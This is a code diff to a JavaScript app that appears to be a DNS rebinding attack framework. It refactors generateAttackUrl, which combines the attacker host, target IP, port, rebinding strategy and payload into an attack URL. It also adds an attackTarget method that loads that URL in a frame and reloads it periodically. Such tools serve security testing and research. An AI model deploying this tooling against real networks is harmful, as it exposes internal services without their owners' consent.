@@ -303,6 +303,17 @@ const App = () => {
         document.getElementById(configuration.getRebindingStrategy()).selected = true;
     };
 
+    function generateAttackUrl(targetHostIPAddress, targetPort, payload){
+        return hosturl
+        .replace("%1", configuration.getAttackHostIPAddress())
+        .replace("%2", targetHostIPAddress) // replace(/-/g, '--'))
+        .replace("%3", Math.floor(Math.random() * Math.floor(Number.MAX_SAFE_INTEGER)))
+        .replace("%4", configuration.getRebindingStrategy())
+        .replace("%5", configuration.getAttackHostDomain())
+        .replace("%6", targetPort)
+        .replace("%7", payload + "?rnd=" + Math.random())
+    };
+
     return {
         getFrameManager() {
             return fm;
@@ -310,15 +321,16 @@ const App = () => {
         getConfiguration() {
             return configuration;
         },
-        generateAttackUrl(targetHostIPAddress, targetPort, payload){
-            return hosturl
-            .replace("%1", configuration.getAttackHostIPAddress())
-            .replace("%2", targetHostIPAddress) // replace(/-/g, '--'))
-            .replace("%3", Math.floor(Math.random() * Math.floor(Number.MAX_SAFE_INTEGER)))
-            .replace("%4", configuration.getRebindingStrategy())
-            .replace("%5", configuration.getAttackHostDomain())
-            .replace("%6", targetPort)
-            .replace("%7", payload + "?rnd=" + Math.random())
+
+        attackTarget(targetHostIPAddress, targetPort, payload) {
+            let self = this;
+            let fid = self.getFrameManager().addFrame(generateAttackUrl(targetHostIPAddress, targetPort, payload))
+
+            self.addFrameToDOM(self.getFrameManager().frame(fid));
+            self.getFrameManager().frame(fid).setTimer(setInterval((() => {
+                self.reloadAttackFrame(self.getFrameManager().frame(fid))
+            }), parseInt(self.getConfiguration().getInterval()) * 1000));
+
         },
         init() {
             let self = this;
